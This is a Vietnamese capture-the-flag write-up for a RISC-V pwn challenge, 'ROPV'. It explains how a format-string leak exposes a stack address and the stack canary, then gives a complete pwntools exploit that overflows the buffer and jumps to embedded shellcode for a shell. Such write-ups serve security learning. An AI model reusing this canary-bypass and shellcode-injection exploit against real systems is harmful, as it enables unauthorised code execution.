# ROPV
Link hướng dẫn [here](https://hackmd.io/@-igYKgCkR_aGfvddJjS3QA/rk0CLg6H2)
## Source
![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/a5802f02-e5db-4800-9846-a97ad0366399)
## Ý tưởng
- Lỗi bof và fmt
- Đầu tiên ta sẽ tìm stack của nó ở đâu trước đã bằng cách nhập vào 8 byte a và debug, tìm xem nó ở đâu
```c
gef➤  search-pattern aaaaaaaa
[+] Searching 'aaaaaaaa' in memory
[+] In (0x4000001000-0x4000801000), permission=rw-
  0x40007ffc80 - 0x40007ffc88  →   "aaaaaaaa[...]"
```
- Thì ta thấy với %p, nó đã leak cho ta một địa chỉ stack, để kiểm tra ta sẽ nhập vào payload "%paaaaaa", và debug tìm chuỗi thì đúng 2 địa chỉ này là stack
```
0x40007ffc80aaaaaa

gef➤  search-pattern aaaaaa
[+] Searching 'aaaaaa' in memory
[+] In (0x4000001000-0x4000801000), permission=rw-
  0x40007ffc82 - 0x40007ffc88  →   "aaaaaa[...]"
```
- Tiếp theo với %9$p ta leak được canary
- Khi này ta có
```
0x000040007ffc80│+0x0000: "%p %9$p\n"    ← $rsi, $r13, $r14
0x000040007ffc88│+0x0008: 0xd3b7dc8134258000                        #canary
0x000040007ffc90│+0x0010: 0x000000000109d0  →  0xf437e456f8227139   
0x000040007ffc98│+0x0018: 0x00000000010696  →  0x000007132f6040ef
0x000040007ffca0│+0x0020: 0x0000000000000000                       #shellcode 
0x000040007ffca8│+0x0028: 0x0000000000000001
```
## Kết quả
![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/9178c0d4-96d4-4da6-a589-30ef87028b73)

```python
#!/usr/bin/python3

from pwn import *

exe = ELF('ropv', checksec=False)

# context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


                c
                ''')
        input()


shellcode = b'\x01\x11\x06\xec\x22\xe8\x13\x04\x21\x02\xb7\x67\x69\x6e\x93\x87\xf7\x22\x23\x30\xf4\xfe\xb7\x77\x68\x10\x33\x48\x08\x01\x05\x08\x72\x08\xb3\x87\x07\x41\x93\x87\xf7\x32\x23\x32\xf4\xfe\x93\x07\x04\xfe\x01\x46\x81\x45\x3e\x85\x93\x08\xd0\x0d\x93\x06\x30\x07\x23\x0e\xd1\xee\x93\x06\xe1\xef\x67\x80\xe6\xff'
def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('')
else:
    p = process('qemu-riscv64 -g 4000 ropv'.split())

GDB()
sla(b"Echo server: ", b"%p %9$p")
stack = int(p.recvuntil(b" ", drop=True), 16)
canary = int(p.recvline(keepends=False), 16)
info("stack: " + hex(stack))
info("canary: " + hex(canary))
payload = b"a" * 8 + p64(canary) + b'a'*8+ p64(stack+32) + shellcode
sla(b"Echo server: ", payload)

p.interactive()
```
